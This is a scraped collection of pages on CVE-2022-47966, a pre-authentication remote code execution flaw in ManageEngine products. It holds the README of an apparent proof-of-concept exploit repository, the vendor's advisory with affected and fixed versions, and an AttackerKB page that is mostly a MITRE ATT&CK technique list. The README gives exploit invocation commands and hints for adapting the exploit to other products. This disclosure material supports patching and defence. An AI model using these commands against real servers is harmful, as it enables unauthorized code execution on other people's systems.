  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fhorizon3ai%2FCVE-2022-47966)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E&source=header-repo&source_repo=horizon3ai%2FCVE-2022-47966)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[horizon3ai](/horizon3ai)
/
**[CVE-2022-47966](/horizon3ai/CVE-2022-47966)**
Public

* [Notifications](/login?return_to=%2Fhorizon3ai%2FCVE-2022-47966) You must be signed in to change notification settings
* [Fork
  32](/login?return_to=%2Fhorizon3ai%2FCVE-2022-47966)
* [Star
   125](/login?return_to=%2Fhorizon3ai%2FCVE-2022-47966)

POC for CVE-2022-47966 affecting multiple ManageEngine products

[125
stars](/horizon3ai/CVE-2022-47966/stargazers) [32
forks](/horizon3ai/CVE-2022-47966/forks) [Branches](/horizon3ai/CVE-2022-47966/branches) [Tags](/horizon3ai/CVE-2022-47966/tags) [Activity](/horizon3ai/CVE-2022-47966/activity)
 [Star](/login?return_to=%2Fhorizon3ai%2FCVE-2022-47966)

 [Notifications](/login?return_to=%2Fhorizon3ai%2FCVE-2022-47966) You must be signed in to change notification settings

* [Code](/horizon3ai/CVE-2022-47966)
* [Pull requests
  0](/horizon3ai/CVE-2022-47966/pulls)
* [Actions](/horizon3ai/CVE-2022-47966/actions)
* [Projects
  0](/horizon3ai/CVE-2022-47966/projects)
* [Security](/horizon3ai/CVE-2022-47966/security)
* [Insights](/horizon3ai/CVE-2022-47966/pulse)

Additional navigation options

* [Code](/horizon3ai/CVE-2022-47966)
* [Pull requests](/horizon3ai/CVE-2022-47966/pulls)
* [Actions](/horizon3ai/CVE-2022-47966/actions)
* [Projects](/horizon3ai/CVE-2022-47966/projects)
* [Security](/horizon3ai/CVE-2022-47966/security)
* [Insights](/horizon3ai/CVE-2022-47966/pulse)

# horizon3ai/CVE-2022-47966

    main[Branches](/horizon3ai/CVE-2022-47966/branches)[Tags](/horizon3ai/CVE-2022-47966/tags)Go to fileCode
## Folders and files

| Name | | Name | Last commit message | Last commit date |
| --- | --- | --- | --- | --- |
| Latest commit History[5 Commits](/horizon3ai/CVE-2022-47966/commits/main/) | | |
| [CVE-2022-47966.py](/horizon3ai/CVE-2022-47966/blob/main/CVE-2022-47966.py "CVE-2022-47966.py") | | [CVE-2022-47966.py](/horizon3ai/CVE-2022-47966/blob/main/CVE-2022-47966.py "CVE-2022-47966.py") |  |  |
| [README.md](/horizon3ai/CVE-2022-47966/blob/main/README.md "README.md") | | [README.md](/horizon3ai/CVE-2022-47966/blob/main/README.md "README.md") |  |  |
| View all files | | |

## Repository files navigation

* README
# CVE-2022-47966

POC for CVE-2022-47966 affecting the following ManageEngine products:

* Access Manager Plus
* Active Directory 360
* ADAudit Plus
* ADManager Plus
* ADSelfService Plus
* Analytics Plus
* Application Control Plus
* Asset Explorer
* Browser Security Plus
* Device Control Plus
* Endpoint Central
* Endpoint Central MSP
* Endpoint DLP
* Key Manager Plus
* OS Deployer
* PAM 360
* Password Manager Pro
* Patch Manager Plus
* Remote Access Plus
* Remote Monitoring and Management (RMM)
* ServiceDesk Plus
* ServiceDesk Plus MSP
* SupportCenter Plus
* Vulnerability Manager Plus

This specific POC only works on products utilizing Apache Santuario (xmlsec) <= 1.4.1 such as:

* ServiceDesk Plus
* Endpoint Central
* ADManager Plus
* ADSelfService Plus

Other products may perform additional checks on the SAML response. Modifying this POC to work on products that perform additional checks involves:

* Scanning the logs of the vulnerable product for stack traces or additional logs message indicating an invalid SAML response.
* Reverse engineering the vulnerable product and searching for the code that implements the checks.

## Technical Analysis

A technical root cause analysis of the vulnerability can be found on our blog:
<https://www.horizon3.ai/manageengine-cve-2022-47966-technical-deep-dive>

## Original Researcher's Writeup

[Khoadha of Viettel Security](https://twitter.com/_l0gg) documents his original research of this vulnerability and how it can be exploited across many versions of xmlsec:
<https://blog.viettelcybersecurity.com/saml-show-stopper/>

## Indicators of Compromise

For analyzing ManageEngine logs for indicators of compromise check out our IOC blog:
<https://www.horizon3.ai/manageengine-cve-2022-47966-iocs/>

## Summary

This POC abuses the pre-authentication remote code execution vulnerability to run a command with Java's Runtime.exec method.

## Usage

For Active Directory related products, such as ADManager, an issuer argument is required:

```
root@kali:~# python3 ./CVE-2022-47966.py --url https://10.0.40.90:8443/samlLogin/<guid> --issuer https://sts.windows.net/<guid>/ --command notepad.exe

```

For other products, a URL is all that is required:

```
root@kali:~# python3 ./CVE-2022-47966.py --url https://10.0.40.64:8080/SamlResponseServlet --command notepad.exe

```

## Mitigations

Update to the latest version of the affected product.

## Follow the Horizon3.ai Attack Team on Twitter for the latest security research:

* [Horizon3 Attack Team](https://twitter.com/Horizon3Attack)
* [James Horseman](https://twitter.com/JamesHorseman2)
* [Zach Hanley](https://twitter.com/hacks_zach)

## Disclaimer

This software has been created purely for the purposes of academic research and for the development of effective defensive techniques, and is not intended to be used to attack systems except where explicitly authorized. Project maintainers are not responsible or liable for misuse of the software. Use responsibly.

## About

POC for CVE-2022-47966 affecting multiple ManageEngine products

### Resources

[Readme](#readme-ov-file)

[Activity](/horizon3ai/CVE-2022-47966/activity)
[Custom properties](/horizon3ai/CVE-2022-47966/custom-properties)
### Stars

[**125**
stars](/horizon3ai/CVE-2022-47966/stargazers)
### Watchers

[**4**
watching](/horizon3ai/CVE-2022-47966/watchers)
### Forks

[**32**
forks](/horizon3ai/CVE-2022-47966/forks)
[Report repository](/contact/report-content?content_url=https%3A%2F%2Fgithub.com%2Fhorizon3ai%2FCVE-2022-47966&report=horizon3ai+%28user%29)

## [Releases](/horizon3ai/CVE-2022-47966/releases)

No releases published

## [Packages 0](/orgs/horizon3ai/packages?repo_name=CVE-2022-47966)

No packages published

## Languages

* [Python
  100.0%](/horizon3ai/CVE-2022-47966/search?l=python)

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from www.manageengine.com_8648a69c_20250111_143250.html ===


### Security advisory for remote code execution vulnerability in multiple ManageEngine products

[Home](https://www.manageengine.com/ "Network Management - ManageEngine") »
Security Advisory

**Severity****:** Critical

**CVE ID :** CVE-2022-47966

**Details :**

This advisory addresses an unauthenticated remote code execution vulnerability reported and patched in the following ManageEngine OnPremise products due to the usage of an outdated third party dependency, Apache Santuario.

**ManageEngine On-Demand/cloud products are not affected by this vulnerability.**

**Applicability :**

This advisory is applicable only when **SAML SSO is/was enabled** in the ManageEngine setup.

| Product Name | Impacted Version(s) | Fixed Version(s) | Released On |
| --- | --- | --- | --- |
| Access Manager Plus\* | 4307 and below | [4308](https://www.manageengine.com/privileged-session-management/upgradepack.html "Upgrade Pack") | 7/11/2022 |
| Active Directory 360\*\* | 4309 and below | [4310](https://www.manageengine.com/active-directory-360/service-pack.html "Upgrade Pack") | 28/10/2022 |
| ADAudit Plus\*\* | 7080 and below | [7081](https://www.manageengine.com/products/active-directory-audit/service-pack.html "Upgrade Pack") | 28/10/2022 |
| ADManager Plus\*\* | 7161 and below | [7162](https://www.manageengine.com/products/ad-manager/service-pack.html "Upgrade Pack") | 28/10/2022 |
| ADSelfService Plus\*\* | 6210 and below | [6211](https://www.manageengine.com/products/self-service-password/service-pack.html "Upgrade Pack") | 28/10/2022 |
| Analytics Plus\* | 5140 and below | [5150](https://www.manageengine.com/analytics-plus/service-packs.html "Upgrade Pack") | 7/11/2022 |
| Application Control Plus\* | 10.1.2220.17 and below | [10.1.2220.18](https://www.manageengine.com/application-control/service-packs.html#instructions "Upgrade Pack") | 28/10/2022 |
| Asset Explorer\*\* | 6982 and below | [6983](https://www.manageengine.com/products/asset-explorer/service-packs.html "Upgrade Pack") | 27/10/2022 |
| Browser Security Plus\* | 11.1.2238.5 and below | [11.1.2238.6](https://www.manageengine.com/browser-security/service-packs.html "Upgrade Pack") | 28/10/2022 |
| Device Control Plus\* | 10.1.2220.17 and below | [10.1.2220.18](https://www.manageengine.com/device-control/service-packs.html#instructions "Upgrade Pack") | 28/10/2022 |
| Endpoint Central\* | 10.1.2228.10 and below | [10.1.2228.11](https://www.manageengine.com/products/desktop-central/service-packs.html "Upgrade Pack") | 28/10/2022 |
| Endpoint Central MSP\* | 10.1.2228.10 and below | [10.1.2228.11](https://www.manageengine.com/desktop-management-msp/service-packs.html "Upgrade Pack") | 28/10/2022 |
| Endpoint DLP\* | 10.1.2137.5 and below | [10.1.2137.6](https://www.manageengine.com/endpoint-dlp/service-packs.html "Upgrade Pack") | 28/10/2022 |
| Key Manager Plus\* | 6400 and below | [6401](https://www.manageengine.com/key-manager/upgradepack.html "Upgrade Pack") | 27/10/2022 |
| OS Deployer\* | 1.1.2243.0 and below | [1.1.2243.1](https://www.manageengine.com/products/os-deployer/service-pack.html "Upgrade Pack") | 28/10/2022 |
| PAM 360\* | 5712 and below | [5713](https://www.manageengine.com/privileged-access-management/upgradepack.html "Upgrade Pack") | 7/11/2022 |
| Password Manager Pro\* | 12123 and below | [12124](https://www.manageengine.com/products/passwordmanagerpro/upgradepack.html "Upgrade Pack") | 7/11/2022 |
| Patch Manager Plus\* | 10.1.2220.17 and below | [10.1.2220.18](https://www.manageengine.com/patch-management/service-packs.html#instructions "Upgrade Pack") | 28/10/2022 |
| Remote Access Plus\* | 10.1.2228.10 and below | [10.1.2228.11](https://www.manageengine.com/remote-desktop-management/service-packs.html#how-to-install "Upgrade Pack") | 28/10/2022 |
| Remote Monitoring and Management (RMM)\* | 10.1.40 and below | [10.1.41](https://www.manageengine.com/remote-monitoring-management/service-packs.html#conditons-before-updating-service-packs "Upgrade Pack") | 29/10/2022 |
| ServiceDesk Plus\*\* | 14003 and below | [14004](https://www.manageengine.com/products/service-desk/on-premises/migration-sequence.html "Upgrade Pack") | 27/10/2022 |
| ServiceDesk Plus MSP\*\* | 13000 and below | [13001](https://www.manageengine.com/products/service-desk-msp/service-packs-hotfix.html "Upgrade Pack") | 27/10/2022 |
| SupportCenter Plus\*\* | 11017 to 11025 | [11026](https://www.manageengine.com/products/support-center/service-packs.html "Upgrade Pack") | 28/10/2022 |
| Vulnerability Manager Plus\* | 10.1.2220.17 and below | [10.1.2220.18](https://www.manageengine.com/vulnerability-management/service-packs.html#instructions "Upgrade Pack") | 28/10/2022 |

\* - Applicable only if SAML-based SSO is configured and currently active.

\*\* - Applicable only if SAML-based SSO is configured at least once in the past, regardless of the current SAML-based SSO status.

**Impact:**

This vulnerability allows an unauthenticated adversary to execute arbitrary code when the above SAML SSO criteria is met.

**Fix:**

This issue has been fixed by updating the third party module to the recent version.

**Acknowledgements:**

This vulnerability was reported by **Khoadha of Viettel Cyber Security** through our Bug Bounty program.

Please contact our product support or security@manageengine.com if you need any further assistance.



=== Content from attackerkb.com_92c33d00_20250111_143247.html ===


[![](/static/public/img/logo-condensed-dark.png)
![](/static/public/img/logo-dark.png)
A Rapid7 Project](/)

* [Activity Feed](/activity-feed)
* [Topics](/topics)
* [About](/about)
* [Leaderboard](/leaderboard)

[Log In](/login)

![](/static/private/img/attacker-value/dark/attacker-value-5.svg)

Attacker Value
##### Very High

3

### CVE-2022-47966

3

## CVE ID

AttackerKB requires a CVE ID in order to pull vulnerability data and references from the [CVE list](https://cve.mitre.org)
and the [National Vulnerability Database](https://nvd.nist.gov). If available, please supply below:

CVE ID:

## Add References:

##### Advisory

Description:
URL:

Add Another

##### Exploit

Description:
URL:

Add Another

##### Mitigation

Description:
URL:

Add Another

##### Related AttackerKB Topic

Description:
URL:

Add Another

##### Government or Industry Alert

Description:
URL:

Add Another

##### Miscellaneous

Description:
URL:

Add Another

Cancel
Submit

![](/static/private/img/attacker-value/dark/attacker-value-5.svg)

Attacker Value
###### Very High

(2 users assessed)

![](/static/private/img/attacker-value/dark/attacker-value-3.svg)

Exploitability
###### Moderate

(2 users assessed)

User Interaction
###### [None](/search?userInteraction=NONE)

Privileges Required
###### [None](/search?privilegesRequired=NONE)

Attack Vector
###### [Network](/search?attackVector=NETWORK)

3

# CVE-2022-47966

Disclosure Date: January 18, 2023
•
(Last updated September 17, 2024) ▾

[CVE-2022-47966](/search?q=CVE-2022-47966)
CVSS v3 Base Score:
9.8

Exploited in the Wild

Reported by [mkienow-r7](/contributors/mkienow-r7)  [and 4 more...](#exploited-in-the-wild)

[View Source Details](#exploited-in-the-wild)

Report As Exploited in the Wild

MITRE ATT&CK[Log in to add MITRE ATT&CK tag](/login)
Add MITRE ATT&CK tactics and techniques that apply to this CVE.
Initial Access
Techniques

Validation

Exploit Public-Facing Application

Validated

### MITRE ATT&CK

Select the MITRE ATT&CK Tactics that apply to this CVE

Initial AccessExecutionPersistencePrivilege EscalationDefense EvasionCredential AccessDiscoveryLateral MovementCollectionExfiltrationCommand and ControlImpact

##### Collection

Select any Techniques used:

Data from Local System

Data from Removable Media

Data from Network Shared Drive

Input Capture

Input Capture: Keylogging

Input Capture: GUI Input Capture

Input Capture: Web Portal Capture

Input Capture: Credential API Hooking

Data Staged

Data Staged: Local Data Staging

Data Staged: Remote Data Staging

Screen Capture

Email Collection

Email Collection: Local Email Collection

Email Collection: Remote Email Collection

Email Collection: Email Forwarding Rule

Clipboard Data

Automated Collection

Audio Capture

Video Capture

Man in the Browser

Data from Information Repositories

Data from Information Repositories: Confluence

Data from Information Repositories: Sharepoint

Data from Cloud Storage Object

Man-in-the-Middle

Man-in-the-Middle: LLMNR/NBT-NS Poisoning and SMB Relay

Archive Collected Data

Archive Collected Data: Archive via Utility

Archive Collected Data: Archive via Library

Archive Collected Data: Archive via Custom Method

##### Command and Control

Select any Techniques used:

Data Obfuscation

Data Obfuscation: Junk Data

Data Obfuscation: Steganography

Data Obfuscation: Protocol Impersonation

Fallback Channels

Application Layer Protocol

Application Layer Protocol: Web Protocols

Application Layer Protocol: File Transfer Protocols

Application Layer Protocol: Mail Protocols

Application Layer Protocol: DNS

Proxy

Proxy: Internal Proxy

Proxy: External Proxy

Proxy: Multi-hop Proxy

Proxy: Domain Fronting

Communication Through Removable Media

Non-Application Layer Protocol

Web Service

Web Service: Dead Drop Resolver

Web Service: Bidirectional Communication

Web Service: One-Way Communication

Multi-Stage Channels

Ingress Tool Transfer

Data Encoding

Data Encoding: Standard Encoding

Data Encoding: Non-Standard Encoding

Traffic Signaling

Traffic Signaling: Port Knocking

Remote Access Software

Dynamic Resolution

Dynamic Resolution: Fast Flux DNS

Dynamic Resolution: Domain Generation Algorithms

Dynamic Resolution: DNS Calculation

Non-Standard Port

Protocol Tunneling

Encrypted Channel

Encrypted Channel: Symmetric Cryptography

Encrypted Channel: Asymmetric Cryptography

##### Credential Access

Select any Techniques used:

OS Credential Dumping

OS Credential Dumping: LSASS Memory

OS Credential Dumping: Security Account Manager

OS Credential Dumping: NTDS

OS Credential Dumping: LSA Secrets

OS Credential Dumping: Cached Domain Credentials

OS Credential Dumping: DCSync

OS Credential Dumping: Proc Filesystem

OS Credential Dumping: /etc/passwd and /etc/shadow

Network Sniffing

Input Capture

Input Capture: Keylogging

Input Capture: GUI Input Capture

Input Capture: Web Portal Capture

Input Capture: Credential API Hooking

Brute Force

Brute Force: Password Guessing

Brute Force: Password Cracking

Brute Force: Password Spraying

Brute Force: Credential Stuffing

Two-Factor Authentication Interception

Forced Authentication

Exploitation for Credential Access

Steal Application Access Token

Steal Web Session Cookie

Unsecured Credentials

Unsecured Credentials: Credentials In Files

Unsecured Credentials: Credentials in Registry

Unsecured Credentials: Bash History

Unsecured Credentials: Private Keys

Unsecured Credentials: Cloud Instance Metadata API

Unsecured Credentials: Group Policy Preferences

Credentials from Password Stores

Credentials from Password Stores: Keychain

Credentials from Password Stores: Securityd Memory

Credentials from Password Stores: Credentials from Web Browsers

Modify Authentication Process

Modify Authentication Process: Domain Controller Authentication

Modify Authentication Process: Password Filter DLL

Modify Authentication Process: Pluggable Authentication Modules

Man-in-the-Middle

Man-in-the-Middle: LLMNR/NBT-NS Poisoning and SMB Relay

Steal or Forge Kerberos Tickets

Steal or Forge Kerberos Tickets: Golden Ticket

Steal or Forge Kerberos Tickets: Silver Ticket

Steal or Forge Kerberos Tickets: Kerberoasting

##### Defense Evasion

Select any Techniques used:

Direct Volume Access

Rootkit

Obfuscated Files or Information

Obfuscated Files or Information: Binary Padding

Obfuscated Files or Information: Software Packing

Obfuscated Files or Information: Steganography

Obfuscated Files or Information: Compile After Delivery

Obfuscated Files or Information: Indicator Removal from Tools

Masquerading

Masquerading: Invalid Code Signature

Masquerading: Right-to-Left Override

Masquerading: Rename System Utilities

Masquerading: Masquerade Task or Service

Masquerading: Match Legitimate Name or Location

Masquerading: Space after Filename

Process Injection

Process Injection: Dynamic-link Library Injection

Process Injection: Portable Executable Injection

Process Injection: Thread Execution Hijacking

Process Injection: Asynchronous Procedure Call

Process Injection: Thread Local Storage

Process Injection: Ptrace System Calls

Process Injection: Proc Memory

Process Injection: Extra Window Memory Injection

Process Injection: Process Hollowing

Process Injection: Process Doppelgänging

Process Injection: VDSO Hijacking

Indicator Removal on Host

Indicator Removal on Host: Clear Windows Event Logs

Indicator Removal on Host: Clear Linux or Mac System Logs

Indicator Removal on Host: Clear Command History

Indicator Removal on Host: File Deletion

Indicator Removal on Host: Network Share Connection Removal

Indicator Removal on Host: Timestomp

Valid Accounts

Valid Accounts: Default Accounts

Valid Accounts: Domain Accounts

Valid Accounts: Local Accounts

Valid Accounts: Cloud Accounts

Modify Registry

Trusted Developer Utilities Proxy Execution

Trusted Developer Utilities Proxy Execution: MSBuild

Access Token Manipulation

Access Token Manipulation: Token Impersonation/Theft

Access Token Manipulation: Create Process with Token

Access Token Manipulation: Make and Impersonate Token

Access Token Manipulation: Parent PID Spoofing

Access Token Manipulation: SID-History Injection

Deobfuscate/Decode Files or Information

BITS Jobs

Indirect Command Execution

Traffic Signaling

Traffic Signaling: Port Knocking

Rogue Domain Controller

Exploitation for Defense Evasion

Signed Script Proxy Execution

Signed Script Proxy Execution: PubPrn

Signed Binary Proxy Execution

Signed Binary Proxy Execution: Compiled HTML File

Signed Binary Proxy Execution: Control Panel

Signed Binary Proxy Execution: CMSTP

Signed Binary Proxy Execution: InstallUtil

Signed Binary Proxy Execution: Mshta

Signed Binary Proxy Execution: Msiexec

Signed Binary Proxy Execution: Odbcconf

Signed Binary Proxy Execution: Regsvcs/Regasm

Signed Binary Proxy Execution: Regsvr32

Signed Binary Proxy Execution: Rundll32

XSL Script Processing

Template Injection

File and Directory Permissions Modification

File and Directory Permissions Modification: Windows File and Directory Permissions Modification

File and Directory Permissions Modification: Linux and Mac File and Directory Permissions Modification

Execution Guardrails

Execution Guardrails: Environmental Keying

Group Policy Modification

Virtualization/Sandbox Evasion

Virtualization/Sandbox Evasion: System Checks

Virtualization/Sandbox Evasion: User Activity Based Checks

Virtualization/Sandbox Evasion: Time Based Evasion

Unused/Unsupported Cloud Regions

Pre-OS Boot

Pre-OS Boot: System Firmware

Pre-OS Boot: Component Firmware

Pre-OS Boot: Bootkit

Abuse Elevation Control Mechanism

Abuse Elevation Control Mechanism: Setuid and Setgid

Abuse Elevation Control Mechanism: Bypass User Access Control

Abuse Elevation Control Mechanism: Sudo and Sudo Caching

Abuse Elevation Control Mechanism: Elevated Execution with Prompt

Use Alternate Authentication Material

Use Alternate Authentication Material: Application Access Token

Use Alternate Authentication Material: Pass the Hash

Use Alternate Authentication Material: Pass the Ticket

Use Alternate Authentication Material: Web Session Cookie

Subvert Trust Controls

Subvert Trust Controls: Gatekeeper Bypass

Subvert Trust Controls: Code Signing

Subvert Trust Controls: SIP and Trust Provider Hijacking

Subvert Trust Controls: Install Root Certificate

Modify Authentication Process

Modify Authentication Process: Domain Controller Authentication

Modify Authentication Process: Password Filter DLL

Modify Authentication Process: Pluggable Authentication Modules

Impair Defenses

Impair Defenses: Disable or Modify Tools

Impair Defenses: Disable Windows Event Logging

Impair Defenses: HISTCONTROL

Impair Defenses: Disable or Modify System Firewall

Impair Defenses: Indicator Blocking

Impair Defenses: Disable or Modify Cloud Firewall

Hide Artifacts

Hide Artifacts: Hidden Files and Directories

Hide Artifacts: Hidden Users

Hide Artifacts: Hidden Window

Hide Artifacts: NTFS File Attributes

Hide Artifacts: Hidden File System

Hide Artifacts: Run Virtual Instance

Hijack Execution Flow

Hijack Execution Flow: DLL Search Order Hijacking

Hijack Execution Flow: DLL Side-Loading

Hijack Execution Flow: Dylib Hijacking

Hijack Execution Flow: Executable Installer File Permissions Weakness

Hijack Execution Flow: LD\_PRELOAD

Hijack Execution Flow: Path Interception by PATH Environment Variable

Hijack Execution Flow: Path Interception by Search Order Hijacking

Hijack Execution Flow: Path Interception by Unquoted Path

Hijack Execution Flow: Services File Permissions Weakness

Hijack Execution Flow: Services Registry Permissions Weakness

Hijack Execution Flow: COR\_PROFILER

Modify Cloud Compute Infrastructure

Modify Cloud Compute Infrastructure: Create Snapshot

Modify Cloud Compute Infrastructure: Create Cloud Instance

Modify Cloud Compute Infrastructure: Delete Cloud Instance

Modify Cloud Compute Infrastructure: Revert Cloud Instance

##### Discovery

Select any Techniques used:

System Service Discovery

Application Window Discovery

Query Registry

System Network Configuration Discovery

Remote System Discovery

System Owner/User Discovery

Network Sniffing

Network Service Scanning

System Network Connections Discovery

Process Discovery

Permission Groups Discovery

Permission Groups Discovery: Local Groups

Permission Groups Discovery: Domain Groups

Permission Groups Discovery: Cloud Groups

System Information Discovery

File and Directory Discovery

Account Discovery

Account Discovery: Local Account

Account Discovery: Domain Account

Account Discovery: Email Account

Account Discovery: Cloud Account

Peripheral Device Discovery

System Time Discovery

Network Share Discovery

Password Policy Discovery

Browser Bookmark Discovery

Domain Trust Discovery

Virtualization/Sandbox Evasion

Virtualization/Sandbox Evasion: System Checks

Virtualization/Sandbox Evasion: User Activity Based Checks

Virtualization/Sandbox Evasion: Time Based Evasion

Software Discovery

Software Discovery: Security Software Discovery

Cloud Service Discovery

Cloud Service Dashboard

##### Execution

Select any Techniques used:

Windows Management Instrumentation

Scheduled Task/Job

Scheduled Task/Job: At (Linux)

Scheduled Task/Job: At (Windows)

Scheduled Task/Job: Cron

Scheduled Task/Job: Launchd

Scheduled Task/Job: Scheduled Task

Command and Scripting Interpreter

Command and Scripting Interpreter: PowerShell

Command and Scripting Interpreter: AppleScript

Command and Scripting Interpreter: Windows Command Shell

Command and Scripting Interpreter: Unix Shell

Command and Scripting Interpreter: Visual Basic

Command and Scripting Interpreter: Python

Command and Scripting Interpreter: JavaScript/JScript

Software Deployment Tools

Native API

Shared Modules

Exploitation for Client Execution

User Execution

User Execution: Malicious Link

User Execution: Malicious File

Inter-Process Communication

Inter-Process Communication: Component Object Model

Inter-Process Communication: Dynamic Data Exchange

System Services

System Services: Launchctl

System Services: Service Execution

##### Exfiltration

Select any Techniques used:

Exfiltration Over Other Network Medium

Exfiltration Over Other Network Medium: Exfiltration Over Bluetooth

Automated Exfiltration

Scheduled Transfer

Data Transfer Size Limits

Exfiltration Over C2 Channel

Exfiltration Over Alternative Protocol

Exfiltration Over Alternative Protocol: Exfiltration Over Symmetric Encrypted Non-C2 Protocol

Exfiltration Over Alternative Protocol: Exfiltration Over Asymmetric Encrypted Non-C2 Protocol

Exfiltration Over Alternative Protocol: Exfiltration Over Unencrypted/Obfuscated Non-C2 Protocol

Exfiltration Over Physical Medium

Exfiltration Over Physical Medium: Exfiltration over USB

Transfer Data to Cloud Account

Exfiltration Over Web Service

Exfiltration Over Web Service: Exfiltration to Code Repository

Exfiltration Over Web Service: Exfiltration to Cloud Storage

##### Impact

Select any Techniques used:

Data Destruction

Data Encrypted for Impact

Service Stop

Inhibit System Recovery

Defacement

Defacement: Internal Defacement

Defacement: External Defacement

Firmware Corruption

Resource Hijacking

Network Denial of Service

Network Denial of Service: Direct Network Flood

Network Denial of Service: Reflection Amplification

Endpoint Denial of Service

Endpoint Denial of Service: OS Exhaustion Flood

Endpoint Denial of Service: Service Exhaustion Flood

Endpoint Denial of Service: Application Exhaustion Flood

Endpoint Denial of Service: Application or System Exploitation

System Shutdown/Reboot

Account Access Removal

Disk Wipe

Disk Wipe: Disk Content Wipe

Disk Wipe: Disk Structure Wipe

Data Manipulation

Data Manipulation: Stored Data Manipulation

Data Manipulation: Transmitted Data Manipulation

Data Manipulation: Runtime Data Manipulation

##### Initial Access

Select any Techniques used:

Valid Accounts

Valid Accounts: Default Accounts

Valid Accounts: Domain Accounts

Valid Accounts: Local Accounts

Valid Accounts: Cloud Accounts

Replication Through Removable Media

External Remote Services

Drive-by Compromise

Exploit Public-Facing Application

Supply Chain Compromise

Supply Chain Compromise: Compromise Software Dependencies and Development Tools

Supply Chain Compromise: Compromise Software Supply Chain

Supply Chain Compromise: Compromise Hardware Supply Chain

Trusted Relationship

Hardware Additions

Phishing

Phishing: Spearphishing Attachment

Phishing: Spearphishing Link

Phishing: Spearphishing via Service

##### Lateral Movement

Select any Techniques used:

Remote Services

Remote Services: Remote Desktop Protocol

Remote Services: SMB/Windows Admin Shares

Remote Services: Distributed Component Object Model

Remote Services: SSH

Remote Services: VNC

Remote Services: Windows Remote Management

Software Deployment Tools

Taint Shared Content

Replication Through Removable Media

Exploitation of Remote Services

Internal Spearphishing

Use Alternate Authentication Material

Use Alternate Authentication Material: Application Access Token

Use Alternate Authentication Material: Pass the Hash

Use Alternate Authentication Material: Pass the Ticket

Use Alternate Authentication Material: Web Session Cookie

Remote Service Session Hijacking

Remote Service Session Hijacking: SSH Hijacking

Remote Service Session Hijacking: RDP Hijacking

Lateral Tool Transfer

##### Persistence

Select any Techniques used:

Boot or Logon Initialization Scripts

Boot or Logon Initialization Scripts: Logon Script (Windows)

Boot or Logon Initialization Scripts: Logon Script (Mac)

Boot or Logon Initialization Scripts: Network Logon Script

Boot or Logon Initialization Scripts: Rc.common

Boot or Logon Initialization Scripts: Startup Items

Scheduled Task/Job

Scheduled Task/Job: At (Linux)

Scheduled Task/Job: At (Windows)

Scheduled Task/Job: Cron

Scheduled Task/Job: Launchd

Scheduled Task/Job: Scheduled Task

Valid Accounts

Valid Accounts: Default Accounts

Valid Accounts: Domain Accounts

Valid Accounts: Local Accounts

Valid Accounts: Cloud Accounts

Account Manipulation

Account Manipulation: Additional Azure Service Principal Credentials

Account Manipulation: Exchange Email Delegate Permissions

Account Manipulation: Add Office 365 Global Administrator Role

Account Manipulation: SSH Authorized Keys

External Remote Services

Create Account

Create Account: Local Account

Create Account: Domain Account

Create Account: Cloud Account

Office Application Startup

Office Application Startup: Office Template Macros

Office Application Startup: Office Test

Office Application Startup: Outlook Forms

Office Application Startup: Outlook Home Page

Office Application Startup: Outlook Rules

Office Application Startup: Add-ins

Browser Extensions

BITS Jobs

Traffic Signaling

Traffic Signaling: Port Knocking

Server Software Component

Server Software Component: SQL Stored Procedures

Server Software Component: Transport Agent

Server Software Component: Web Shell

Implant Container Image

Pre-OS Boot

Pre-OS Boot: System Firmware

Pre-OS Boot: Component Firmware

Pre-OS Boot: Bootkit

Create or Modify System Process

Create or Modify System Process: Launch Agent

Create or Modify System Process: Systemd Service

Create or Modify System Process: Windows Service

Create or Modify System Process: Launch Daemon

Event Triggered Execution

Event Triggered Execution: Change Default File Association

Event Triggered Execution: Screensaver

Event Triggered Execution: Windows Management Instrumentation Event Subscription

